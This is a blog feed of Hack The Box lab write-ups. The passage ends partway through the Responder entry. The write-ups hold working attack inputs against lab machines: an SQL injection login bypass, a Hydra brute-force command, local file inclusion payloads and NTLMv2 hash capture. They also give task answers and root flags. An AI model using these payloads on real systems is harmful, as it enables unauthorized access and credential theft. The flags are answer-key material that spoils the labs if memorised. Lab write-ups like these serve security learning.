@@ -1,0 +1,1015 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-03-12T15:27:25+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">py-us3r.io</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><entry><title type="html">Appointment - Hack The Box</title><link href="http://localhost:4000/htb-writeup-appointment/" rel="alternate" type="text/html" title="Appointment - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-appointment</id><content type="html" xml:base="http://localhost:4000/htb-writeup-appointment/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250310105353.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we are exploiting an SQL Injection in the login panel.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.242.134
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.242.134
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310105700.png" alt="" /></p>
+    <h2 id="exploitation">Exploitation</h2>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250310105830.png" alt="" /></p>
+
+<p>Password –&gt; admin ‘ or 1=1– -</p>
+
+<p>SQL query example:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">flag</span> <span class="k">from</span> <span class="n">users</span>
+<span class="k">where</span> <span class="k">user</span><span class="o">==</span><span class="s1">'admin'</span> <span class="k">and</span> <span class="n">password</span><span class="o">==</span><span class="s1">'admin'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -'</span>
+</code></pre></div></div>
+<h2 id="tasks">Tasks</h2>
+
+<ol>
+  <li>What does the acronym SQL stand for?
+    <blockquote>
+      <p>Structured Query Language</p>
+    </blockquote>
+  </li>
+  <li>What is one of the most common type of SQL vulnerabilities?
+    <blockquote>
+      <p>sql injection</p>
+    </blockquote>
+  </li>
+  <li>What is the 2021 OWASP Top 10 classification for this vulnerability?
+    <blockquote>
+      <p>A03:2021-Injection</p>
+    </blockquote>
+  </li>
+  <li>What does Nmap report as the service and version that are running on port 80 of the target?
+    <blockquote>
+      <p>Apache httpd 2.4.38 ((Debian))</p>
+    </blockquote>
+  </li>
+  <li>What is the standard port used for the HTTPS protocol?
+    <blockquote>
+      <p>443</p>
+    </blockquote>
+  </li>
+  <li>What is a folder called in web-application terminology?
+    <blockquote>
+      <p>directory</p>
+    </blockquote>
+  </li>
+  <li>What is the HTTP response code is given for ‘Not Found’ errors?
+    <blockquote>
+      <p>404</p>
+    </blockquote>
+  </li>
+  <li>Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains?
+    <blockquote>
+      <p>dir</p>
+    </blockquote>
+  </li>
+  <li>What single character can be used to comment out the rest of a line in MySQL?
+    <blockquote>
+      <p>#</p>
+    </blockquote>
+  </li>
+  <li>If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?
+    <blockquote>
+      <p>congratulations</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>e3d0796d002a446c0e622226f42e9672</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250310110919.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="SQL Injection" /><summary type="html"><![CDATA[In this machine, we are exploiting an SQL Injection in the login panel.]]></summary></entry><entry><title type="html">Crocodile - Hack The Box</title><link href="http://localhost:4000/htb-writeup-crocodile/" rel="alternate" type="text/html" title="Crocodile - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-crocodile</id><content type="html" xml:base="http://localhost:4000/htb-writeup-crocodile/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250310120957.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.1.15
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.1.15
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310122012.png" alt="" /></p>
+  </li>
+  <li>Vulnerability scanning with nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,80 10.129.1.15
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310122217.png" alt="" /></p>
+  </li>
+  <li>Fuzzing with gobuster
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.1.15/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">--add-slash</span> <span class="nt">-t</span> 100
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310123251.png" alt="" /></p>
+    <h2 id="exploitation">Exploitation</h2>
+  </li>
+  <li>Login FTP with anonymous user
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.1.15
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310122549.png" alt="" /></p>
+    <blockquote>
+      <p>Password –&gt; anonymous</p>
+    </blockquote>
+  </li>
+  <li>Brute forcing login pannel with hydra</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Check the pannel login request 
+<img src="/img2/Pasted%20image%2020250310123726.png" alt="" />
+<img src="/img2/Pasted%20image%2020250310123820.png" alt="" /></p>
+  </li>
+  <li>
+    <p>Run attack with hydra</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> allowed.userlist <span class="nt">-P</span> allowed.userlist.passwd 10.129.1.15 http-post-form <span class="s2">"/login.php:Username=^USER^&amp;Password=^PASS^&amp;Submit=Login:F=Warning</span><span class="se">\!</span><span class="s2">"</span>
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310125148.png" alt="" /></p>
+    <h2 id="tasks">Tasks</h2>
+  </li>
+</ul>
+
+<ol>
+  <li>What Nmap scanning switch employs the use of default scripts during a scan?
+    <blockquote>
+      <p>-sC</p>
+    </blockquote>
+  </li>
+  <li>What service version is found to be running on port 21?
+    <blockquote>
+      <p>vsftpd 3.0.3</p>
+    </blockquote>
+  </li>
+  <li>What FTP code is returned to us for the “Anonymous FTP login allowed” message?
+    <blockquote>
+      <p>230</p>
+    </blockquote>
+  </li>
+  <li>After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
+    <blockquote>
+      <p>anonymous</p>
+    </blockquote>
+  </li>
+  <li>After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
+    <blockquote>
+      <p>get</p>
+    </blockquote>
+  </li>
+  <li>What is one of the higher-privilege sounding usernames in ‘allowed.userlist’ that we download from the FTP server?
+    <blockquote>
+      <p>admin</p>
+    </blockquote>
+  </li>
+  <li>What version of Apache HTTP Server is running on the target host?
+    <blockquote>
+      <p>Apache httpd 2.4.41</p>
+    </blockquote>
+  </li>
+  <li>What switch can we use with Gobuster to specify we are looking for specific filetypes?
+    <blockquote>
+      <p>-x</p>
+    </blockquote>
+  </li>
+  <li>Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
+    <blockquote>
+      <p>login.php</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>c7110277ac44d78b6a9fff2232434d16</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250310125709.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="ftp" /><summary type="html"><![CDATA[In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.]]></summary></entry><entry><title type="html">Dancing - Hack The Box</title><link href="http://localhost:4000/htb-writeup-dancing/" rel="alternate" type="text/html" title="Dancing - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-dancing</id><content type="html" xml:base="http://localhost:4000/htb-writeup-dancing/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250309174721.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine we are taking advantage of resource sharing misconfiguration in SMB service.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.77.89
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.77.89
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250309172957.png" alt="" /></p>
+  </li>
+  <li>See available sources with smbclient
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 10.129.77.89 <span class="nt">-N</span>
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250309173756.png" alt="" /></p>
+    <h2 id="exploitation">Exploitation</h2>
+  </li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.129.77.89/WorkShares <span class="nt">-N</span>
+</code></pre></div></div>
+<p><img src="/img2/Pasted%20image%2020250309173908.png" alt="" /></p>
+<h2 id="task">Task</h2>
+
+<ol>
+  <li>What does the 3-letter acronym SMB stand for?
+    <blockquote>
+      <p>server message block</p>
+    </blockquote>
+  </li>
+  <li>What port does SMB use to operate at?
+    <blockquote>
+      <p>445</p>
+    </blockquote>
+  </li>
+  <li>What is the service name for port 445 that came up in our Nmap scan?
+    <blockquote>
+      <p>microsoft-ds</p>
+    </blockquote>
+  </li>
+  <li>What is the ‘flag’ or ‘switch’ that we can use with the smbclient utility to ‘list’ the available shares on Dancing?
+    <blockquote>
+      <p>-L</p>
+    </blockquote>
+  </li>
+  <li>How many shares are there on Dancing?
+    <blockquote>
+      <p>4</p>
+    </blockquote>
+  </li>
+  <li>What is the name of the share we are able to access in the end with a blank password?
+    <blockquote>
+      <p>WorkShares</p>
+    </blockquote>
+  </li>
+  <li>What is the command we can use within the SMB shell to download the files we find?
+    <blockquote>
+      <p>get</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>5f61c10dffbc77a704d76016a22f1664</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250309174551.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="smb" /><summary type="html"><![CDATA[In this machine we are taking advantage of resource sharing misconfiguration in SMB service.]]></summary></entry><entry><title type="html">Fawn - Hack The Box</title><link href="http://localhost:4000/htb-writeup-fawn/" rel="alternate" type="text/html" title="Fawn - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-fawn</id><content type="html" xml:base="http://localhost:4000/htb-writeup-fawn/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250309163746.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine we are taking advantage of ftp anonymous login.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.245.175
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.245.175
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250309164010.png" alt="" /></p>
+  </li>
+  <li>Vulnerability scanning with nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span> 10.129.245.175
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250309164400.png" alt="" /></p>
+  </li>
+</ol>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.245.175
+</code></pre></div></div>
+<p><img src="/img2/Pasted%20image%2020250309164650.png" alt="" /></p>
+<blockquote>
+  <p>Password –&gt; anonymous</p>
+</blockquote>
+
+<h2 id="task">Task</h2>
+
+<ol>
+  <li>What does the 3-letter acronym FTP stand for?
+    <blockquote>
+      <p>file transfer protocol</p>
+    </blockquote>
+  </li>
+  <li>Which port does the FTP service listen on usually?
+    <blockquote>
+      <p>21</p>
+    </blockquote>
+  </li>
+  <li>FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?
+    <blockquote>
+      <p>SFTP</p>
+    </blockquote>
+  </li>
+  <li>What is the command we can use to send an ICMP echo request to test our connection to the target?
+    <blockquote>
+      <p>ping</p>
+    </blockquote>
+  </li>
+  <li>From your scans, what version is FTP running on the target?
+    <blockquote>
+      <p>vsftpd 3.0.3</p>
+    </blockquote>
+  </li>
+  <li>From your scans, what OS type is running on the target?
+    <blockquote>
+      <p>unix</p>
+    </blockquote>
+  </li>
+  <li>What is the command we need to run in order to display the ‘ftp’ client help menu?
+    <blockquote>
+      <p>ftp -?</p>
+    </blockquote>
+  </li>
+  <li>What is username that is used over FTP when you want to log in without having an account?
+    <blockquote>
+      <p>anonymous</p>
+    </blockquote>
+  </li>
+  <li>What is the response code we get for the FTP message ‘Login successful’?
+    <blockquote>
+      <p>230</p>
+    </blockquote>
+  </li>
+  <li>There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.
+    <blockquote>
+      <p>ls</p>
+    </blockquote>
+  </li>
+  <li>What is the command used to download the file we found on the FTP server?
+    <blockquote>
+      <p>get</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>035db21c881520061c53e0536e44f815</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250309165718.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="ftp" /><summary type="html"><![CDATA[In this machine we are taking advantage of ftp anonymous login.]]></summary></entry><entry><title type="html">Meow - Hack The Box</title><link href="http://localhost:4000/htb-writeup-meow/" rel="alternate" type="text/html" title="Meow - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-meow</id><content type="html" xml:base="http://localhost:4000/htb-writeup-meow/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250309155106.png" alt="" /></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we are taking advantage of a misconfigured Telnet service using blank password.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.147.154
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.147.154
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250309155856.png" alt="" /></p>
+    <h2 id="exploitation">Exploitation</h2>
+  </li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.129.147.154
+</code></pre></div></div>
+<p><img src="/img2/Pasted%20image%2020250309161642.png" alt="" /></p>
+
+<blockquote>
+  <p>Login root with blank password</p>
+</blockquote>
+
+<h2 id="tasks">Tasks</h2>
+
+<ol>
+  <li>What does the acronym VM stand for?
+    <blockquote>
+      <p>Virtual Machine</p>
+    </blockquote>
+  </li>
+  <li>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.
+    <blockquote>
+      <p>Terminal</p>
+    </blockquote>
+  </li>
+  <li>What service do we use to form our VPN connection into HTB labs?
+    <blockquote>
+      <p>openvpn</p>
+    </blockquote>
+  </li>
+  <li>What tool do we use to test our connection to the target with an ICMP echo request?
+    <blockquote>
+      <p>ping</p>
+    </blockquote>
+  </li>
+  <li>What is the name of the most common tool for finding open ports on a target?
+    <blockquote>
+      <p>nmap</p>
+    </blockquote>
+  </li>
+  <li>What service do we identify on port 23/tcp during our scans?
+    <blockquote>
+      <p>telnet</p>
+    </blockquote>
+  </li>
+  <li>What username is able to log into the target over telnet with a blank password?
+    <blockquote>
+      <p>root</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>b40abdfe23665f766f9c61ecba8a4c19</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250309162122.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="telnet" /><summary type="html"><![CDATA[In this machine, we are taking advantage of a misconfigured Telnet service using blank password.]]></summary></entry><entry><title type="html">Redeemer - Hack The Box</title><link href="http://localhost:4000/htb-writeup-redeemer/" rel="alternate" type="text/html" title="Redeemer - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-redeemer</id><content type="html" xml:base="http://localhost:4000/htb-writeup-redeemer/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250310094004.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we are exploiting a misconfigured Redis service that has no credentials.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.199.109
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.199.109
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310094339.png" alt="" /></p>
+  </li>
+</ol>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis-cli <span class="nt">-h</span> 10.129.199.109
+</code></pre></div></div>
+<p><img src="/img2/Pasted%20image%2020250310100227.png" alt="" />
+<img src="/img2/Pasted%20image%2020250310095830.png" alt="" /></p>
+
+<h2 id="task">Task</h2>
+
+<ol>
+  <li>Which TCP port is open on the machine?
+    <blockquote>
+      <p>6379</p>
+    </blockquote>
+  </li>
+  <li>Which service is running on the port that is open on the machine?
+    <blockquote>
+      <p>redis</p>
+    </blockquote>
+  </li>
+  <li>What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database
+    <blockquote>
+      <p>In-memory Database</p>
+    </blockquote>
+  </li>
+  <li>Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
+    <blockquote>
+      <p>redis-cli</p>
+    </blockquote>
+  </li>
+  <li>Which flag is used with the Redis command-line utility to specify the hostname?
+    <blockquote>
+      <p>-h</p>
+    </blockquote>
+  </li>
+  <li>Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?
+    <blockquote>
+      <p>info</p>
+    </blockquote>
+  </li>
+  <li>What is the version of the Redis server being used on the target machine?
+    <blockquote>
+      <p>5.0.7</p>
+    </blockquote>
+  </li>
+  <li>Which command is used to select the desired database in Redis?
+    <blockquote>
+      <p>select</p>
+    </blockquote>
+  </li>
+  <li>How many keys are present inside the database with index 0?
+    <blockquote>
+      <p>4</p>
+    </blockquote>
+  </li>
+  <li>Which command is used to obtain all the keys in a database?
+    <blockquote>
+      <p>keys *</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>03e1d2b376c37ab3f5319922053953eb</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250310100459.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="redis" /><summary type="html"><![CDATA[In this machine, we are exploiting a misconfigured Redis service that has no credentials.]]></summary></entry><entry><title type="html">Responder - Hack The Box</title><link href="http://localhost:4000/htb-writeup-responder/" rel="alternate" type="text/html" title="Responder - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-responder</id><content type="html" xml:base="http://localhost:4000/htb-writeup-responder/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250311104959.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.208.162
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.208.162
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311105508.png" alt="" /></p>
+  </li>
+  <li>Add domain to /etc/hosts
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.208.162 unika.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div>    </div>
+  </li>
+  <li>See the machine technologies
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb unika.htb
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311105948.png" alt="" /></p>
+  </li>
+  <li>Check source code of index page
+<img src="/img2/Pasted%20image%2020250311112945.png" alt="" />
+    <blockquote>
+      <p>We found a possible LFI</p>
+    </blockquote>
+  </li>
+  <li>(BONUS) Try to view the backend code of index.php</li>
+</ol>
+
+<ul>
+  <li>Send response to index.php
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://unika.htb/index.php?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index.php <span class="o">&gt;</span> index.php
+</code></pre></div>    </div>
+  </li>
+  <li>Decode index.php
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>index.php | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311113625.png" alt="" /></p>
+    <blockquote>
+      <p>If “page” is not in the url show the english.html, else allow the user to choose the file to show.</p>
+    </blockquote>
+  </li>
+</ul>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<ol>
+  <li>Test LFI
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://unika.htb/index.php?page<span class="o">=</span>../../../../windows/win.ini
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311114816.png" alt="" /></p>
+  </li>
+  <li>Get NTLM Hash with wireshark</li>
+</ol>
+
+<ul>
+  <li>Create SMB service in the host and upload test file
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>samba
+</code></pre></div>    </div>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /usr/share/samba/publico
+</code></pre></div>    </div>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"TEST"</span> <span class="o">&gt;</span> /usr/share/samba/publico/test.txt
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311141417.png" alt="" /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl restart smbd
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Intercept the request to own SMB service with wireshark
+<img src="/img2/Pasted%20image%2020250311141559.png" alt="" /></p>
+  </li>
+  <li>Copy values to create the HASH
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User:
+Domain:
+Challenge:
+HMAC-MD5: 
+NTLMv2Response without HMAC: 
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<ol>
+  <li>User and domain:
+<img src="/img2/Pasted%20image%2020250311141928.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge:
+HMAC-MD5: 
+NTLMv2Response without HMAC: 
+</code></pre></div>    </div>
+  </li>
+  <li>Challenge:
+<img src="/img2/Pasted%20image%2020250311142116.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge: 583a9235488cccb1
+HMAC-MD5: 
+NTLMv2Response without HMAC: 
+</code></pre></div>    </div>
+  </li>
+  <li>HMAC-MD5:
+<img src="/img2/Pasted%20image%2020250311142320.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge: 583a9235488cccb1
+HMAC-MD5: fdaa6c84ae9d9f9c07fe6209c9bcacfc
+NTLMv2Response without HMAC-MD5: 
+</code></pre></div>    </div>
+  </li>
+  <li>NTLMv2Response without HMAC-MD5: 
+<img src="/img2/Pasted%20image%2020250311142457.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge: 583a9235488cccb1
+HMAC-MD5: fdaa6c84ae9d9f9c07fe6209c9bcacfc
+NTLMv2Response without HMAC-MD5: 01010000000000006ae580018292db0181e8493b0080dafc0000000002000c0050005900550053004500520001000c0050005900550053004500520004000c0070007900750073006500720003001a007000790075007300650072002e00700079007500730065007200070008006ae580018292db0106000400020000000800300030000000000000000100000000200000686b285cdf2e3909b8b49869d0cc97afddfa35b723d2b709fdba9258165ba3f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330037000000000000000000
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<ul>
+  <li>Create HASH
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User::Domain:Challenge:HMAC-MD5:NTLMv2Response without HMAC-MD5
+</code></pre></div>    </div>
